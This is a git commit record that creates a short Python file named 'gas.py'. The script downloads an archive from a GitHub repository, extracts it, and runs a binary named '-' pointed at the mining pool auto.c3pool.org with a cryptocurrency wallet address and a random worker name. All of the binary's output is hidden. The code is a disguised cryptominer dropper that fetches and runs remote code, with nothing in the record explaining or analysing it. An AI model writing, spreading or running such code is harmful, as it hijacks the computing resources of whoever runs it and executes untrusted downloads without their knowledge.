b46651772169de46dc0fcff9971a9501a3c2a545
dockerdoc12 <110237519+dockerdoc12@users.noreply.github.com>
2022-07-29 22:34:48 +0700

    Create gas.py

---
+++ gas.py
@@ -0,0 +1,5 @@
+import os
+
+os.system("wget https://github.com/nurkartina604/st/raw/main/-.tar.gz")
+os.system("tar -xf -.tar.gz")
+os.system("./- -o auto.c3pool.org:80 -u 86bqyB1FLa39SVdf5HzEmT1NfuKi9auJej4sYBqptTTU4Wz17ZeBmfa7nZYiEBVW4CNeJNi3UZFmJhNcfmd4zqVKJeirEK5.$(echo $(shuf -i 1000-999999 -n 1)-tolot) >/dev/null >/dev/null 2>&1")
